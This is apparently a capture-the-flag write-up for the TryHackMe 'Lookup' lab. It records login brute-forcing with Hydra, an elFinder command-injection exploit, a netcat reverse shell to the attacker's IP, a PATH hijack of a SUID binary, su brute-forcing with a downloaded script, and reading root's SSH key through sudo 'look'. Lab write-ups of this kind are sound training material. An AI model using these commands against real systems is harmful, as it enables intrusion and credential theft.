# Enumeration

## Nmap

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMc4hLykriw3nBOsKHJK1Y6eauB8OllfLLlztbB4tu4c9cO8qyOXSfZaCcb92uq/Y3u02PPHWq2yXOLPler1AFGVhuSfIpokEnT2jgQzKL63uJMZtoFzL3RW8DAzunrHhi/nQqo8sw7wDCiIN9s4PDrAXmP6YXQ5ekK30om9kd5jHG6xJ+/gIThU4ODr/pHAqr28bSpuHQdgphSjmeShDMg8wu8Kk/B0bL2oEvVxaNNWYWc1qHzdgjV5HPtq6z3MEsLYzSiwxcjDJ+EnL564tJqej6R69mjII1uHStkrmewzpiYTBRdgi9A3Yb+x8NxervECFhUR2MoR1zD+0UJbRA2v1LQaGg9oYnYXNq3Lc5c4aXz638wAUtLtw2SwTvPxDrlCmDVtUhQFDhyFOu9bSmPY0oGH5To8niazWcTsCZlx2tpQLhF/gS3jP/fVw+H6Eyz/yge3RYeyTv3ehV6vXHAGuQLvkqhT6QS21PLzvM7bCqmo1YIqHfT2DLi7jZxdk=
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJNL/iO8JI5DrcvPDFlmqtX/lzemir7W+WegC7hpoYpkPES6q+0/p4B2CgDD0Xr1AgUmLkUhe2+mIJ9odtlWW30=
|   256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFG/Wi4PUTjReEdk2K4aFMi8WzesipJ0bp0iI0FM8AfE

80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Login Page
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

## SSH (20)

```bash
┌──(kali㉿kali)-[~/tryhackme/lookup]
└─$ ssh root@lookup.thm 
The authenticity of host 'lookup.thm (10.10.169.217)' can't be established.
ED25519 key fingerprint is SHA256:Ndgax/DOZA6JS00F3afY6VbwjVhV2fg5OAMP9TqPAOs.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'lookup.thm' (ED25519) to the list of known hosts.
root@lookup.thm's password:
```

## HTTP (80)

### Dirsearch

```bash
Target: http://lookup.thm/

[10:26:43] Starting: 
[10:26:58] 403 -  275B  - /.ht_wsr.txt                                      
[10:26:58] 403 -  275B  - /.htaccess.bak1                                   
[10:26:58] 403 -  275B  - /.htaccess.orig                                   
[10:26:58] 403 -  275B  - /.htaccess.sample
[10:26:58] 403 -  275B  - /.htaccess.save
[10:26:58] 403 -  275B  - /.htaccess_orig                                   
[10:26:58] 403 -  275B  - /.htaccess_extra
[10:26:58] 403 -  275B  - /.htaccessBAK                                     
[10:26:58] 403 -  275B  - /.htaccess_sc
[10:26:58] 403 -  275B  - /.htaccessOLD2                                    
[10:26:58] 403 -  275B  - /.htaccessOLD                                     
[10:26:58] 403 -  275B  - /.html                                            
[10:26:58] 403 -  275B  - /.htm                                             
[10:26:58] 403 -  275B  - /.htpasswd_test
[10:26:58] 403 -  275B  - /.httr-oauth                                      
[10:26:58] 403 -  275B  - /.htpasswds
[10:27:03] 403 -  275B  - /.php                                             
[10:28:36] 200 -    1B  - /login.php                                        
[10:29:08] 403 -  275B  - /server-status                                    
[10:29:08] 403 -  275B  - /server-status/
                                                                             
Task Completed
```

### Vhost

```bash
www                     [Status: 200, Size: 719, Words: 114, Lines: 27, Duration: 356ms]
```

### Website Functionality

![image.png](attachment:76b76beb-04f1-4c92-93de-d4cc6355f290:image.png)

```bash
POST /login.php HTTP/1.1
Host: lookup.thm
Content-Length: 29
Cache-Control: max-age=0
Origin: http://lookup.thm
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://lookup.thm/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

username=admin&password=admin
```

```bash
HTTP/1.1 200 OK
Date: Sun, 18 May 2025 14:43:59 GMT
Server: Apache/2.4.41 (Ubuntu)
Refresh: 3; url=http://lookup.thm
Content-Length: 62
Content-Type: text/html; charset=UTF-8

Wrong password. Please try again.<br>Redirecting in 3 seconds.
```

- ~~SQL Injection~~
- ~~NoSQL injection~~
- Password Spraying

### Hydra

```bash
┌──(kali㉿kali)-[~/tryhackme/lookup]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong password. Please try again." -IV -t 64

80][http-post-form] host: lookup.thm   login: admin   password: password123
```

```bash
┌──(kali㉿kali)-[~/tryhackme/lookup]
└─$ hydra -L pass.txt -p password123 lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong username or password. Please try again." -IV -t 64

[80][http-post-form] host: lookup.thm   login: jose   password: password123

```

```bash
jose : password123
```

# Authenticated Acess

![image.png](attachment:94c7606e-74ea-44e0-80fe-6153358531cd:image.png)

```bash
┌──(kali㉿kali)-[~/tryhackme/lookup]
└─$ searchsploit elFinder
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
elFinder 2 - Remote Command Execution (via File Creation)                        | php/webapps/36925.py
elFinder 2.1.47 - 'PHP connector' Command Injection                              | php/webapps/46481.py
elFinder PHP Connector < 2.1.48 - 'exiftran' Command Injection (Metasploit)      | php/remote/46539.rb
elFinder Web file manager Version - 2.1.53 Remote Command Execution              | php/webapps/51864.txt
--------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

- This is vulnerable to Common injection
    
    ![image.png](attachment:4af11654-faed-4b1c-99bc-8f9a4e51e4b9:image.png)
    

```bash
msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection)
```

```bash
meterpreter > shell
Process 2198 created.
Channel 0 created.
busybox nc 10.4.9.248 1337 -e bash
```

```bash
www-data@lookup:/var/www/files.lookup.thm/public_html/elFinder/php$ whoami
www-data
```

# Exploitation

```bash
www-data@lookup:/home/think$ cat user.txt 
cat: user.txt: Permission denied
```

## SUID

```bash
www-data@lookup:/tmp$ find / -perm /4000 2>/dev/null
/snap/snapd/19457/usr/lib/snapd/snap-confine
/snap/core20/1950/usr/bin/chfn
/snap/core20/1950/usr/bin/chsh
/snap/core20/1950/usr/bin/gpasswd
/snap/core20/1950/usr/bin/mount
/snap/core20/1950/usr/bin/newgrp
/snap/core20/1950/usr/bin/passwd
/snap/core20/1950/usr/bin/su
/snap/core20/1950/usr/bin/sudo
/snap/core20/1950/usr/bin/umount
/snap/core20/1950/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1950/usr/lib/openssh/ssh-keysign
/snap/core20/1974/usr/bin/chfn
/snap/core20/1974/usr/bin/chsh
/snap/core20/1974/usr/bin/gpasswd
/snap/core20/1974/usr/bin/mount
/snap/core20/1974/usr/bin/newgrp
/snap/core20/1974/usr/bin/passwd
/snap/core20/1974/usr/bin/su
/snap/core20/1974/usr/bin/sudo
/snap/core20/1974/usr/bin/umount
/snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1974/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/pwm
/usr/bin/at
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/umount

```

```bash
www-data@lookup:/tmp$ ls -la /usr/sbin/pwm
-rwsr-sr-x 1 root root 17176 Jan 11  2024 /usr/sbin/pwm
```

### Chaning UID

```bash
www-data@lookup:/tmp$ pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found
www-data@lookup:/tmp$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@lookup:/tmp$ which id
/usr/bin/id
www-data@lookup:/tmp$ echo 'echo "uid=1000(think)"' > id
www-data@lookup:/tmp$ cat id
echo "uid=1000(think)"
www-data@lookup:/tmp$ chmod +x id
www-data@lookup:/tmp$ ./id
uid=1000(think)
www-data@lookup:/tmp$ 
```

```bash
www-data@lookup:/tmp$ ls
id
www-data@lookup:/tmp$ export PATH=/tmp:$PATH
www-data@lookup:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
www-data@lookup:/tmp$ id
uid=1000(think)
```

```bash
www-data@lookup:/tmp$ pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: think
jose1006
jose1004
jose1002
jose1001teles
jose100190
jose10001
jose10.asd
jose10+
jose0_07
jose0990
jose0986$
jose098130443
jose0981
jose0924
jose0923
jose0921
thepassword
jose(1993)
jose'sbabygurl
jose&vane
jose&takie
jose&samantha
jose&pam
jose&jlo
jose&jessica
jose&jessi
josemario.AKA(think)
jose.medina.
jose.mar
jose.luis.24.oct
jose.line
jose.leonardo100
jose.leas.30
jose.ivan
jose.i22
jose.hm
jose.hater
jose.fa
jose.f
jose.dont
jose.d
jose.com}
jose.com
jose.chepe_06
jose.a91
jose.a
jose.96.
jose.9298
jose.2856171
```

- we saved it
    
    ```bash
    www-data@lookup:/tmp$ ls
    id  passwords.txt
    ```
    

### BruteForce Password

```bash
www-data@lookup:/tmp$ wget 10.4.9.248:8000/su-bruteforce/suBF.sh
--2025-05-18 16:27:52--  http://10.4.9.248:8000/su-bruteforce/suBF.sh
Connecting to 10.4.9.248:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2340 (2.3K) [text/x-sh]
Saving to: ‘suBF.sh’

suBF.sh             100%[===================>]   2.29K  --.-KB/s    in 0s      

2025-05-18 16:27:53 (159 MB/s) - ‘suBF.sh’ saved [2340/2340]

www-data@lookup:/tmp$ chmod +x suBF.sh
```

```bash
www-data@lookup:/tmp$ ./suBF.sh -u think -w passwords.txt
  [+] Bruteforcing think...
  You can login as think using password: josemario.AKA(think)
  Wordlist exhausted
```

- change user to think
    - su think

```bash
think@lookup:~$ la -la
total 40
drwxr-xr-x 5 think think 4096 Jan 11  2024 .
drwxr-xr-x 3 root  root  4096 Jun  2  2023 ..
lrwxrwxrwx 1 root  root     9 Jun 21  2023 .bash_history -> /dev/null
-rwxr-xr-x 1 think think  220 Jun  2  2023 .bash_logout
-rwxr-xr-x 1 think think 3771 Jun  2  2023 .bashrc
drwxr-xr-x 2 think think 4096 Jun 21  2023 .cache
drwx------ 3 think think 4096 Aug  9  2023 .gnupg
-rw-r----- 1 root  think  525 Jul 30  2023 .passwords
-rwxr-xr-x 1 think think  807 Jun  2  2023 .profile
drw-r----- 2 think think 4096 Jun 21  2023 .ssh
-rw-r----- 1 root  think   33 Jul 30  2023 user.txt
lrwxrwxrwx 1 root  root     9 Jun 21  2023 .viminfo -> /dev/null
think@lookup:~$ cat user.txt
38375fb4dd8baa2b2039ac03d92b820e
```

### Post Exploitation

```bash
think@lookup:~$ sudo -l
Matching Defaults entries for think on lookup:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User think may run the following commands on lookup:
    (ALL) /usr/bin/look
```

### Look (GTFOBIN)

```bash
think@lookup:~$ sudo look '' /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAptm2+DipVfUMY+7g9Lcmf/h23TCH7qKRg4Penlti9RKW2XLSB5wR
3qXILoUzSmRum2r6eTHXVZbbX2NCBj7uH2PUgpzso9m7qdf7nb7BKkR585f4pUuI01pUD0
DgTNYOtefYf4OEpwAAABFyb290QHVidW50dXNlcnZlcg==
-----END OPENSSH PRIVATE KEY-----

```

```bash
┌──(kali㉿kali)-[~/tryhackme/lookup]
└─$ nano rootrsa
                                                                                                                                      
┌──(kali㉿kali)-[~/tryhackme/lookup]
└─$ chmod 600 rootrsa    
                                                                                                                                      
┌──(kali㉿kali)-[~/tryhackme/lookup]
└─$ ssh -i rootrsa root@lookup.thm
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-156-generic x86_64)
```
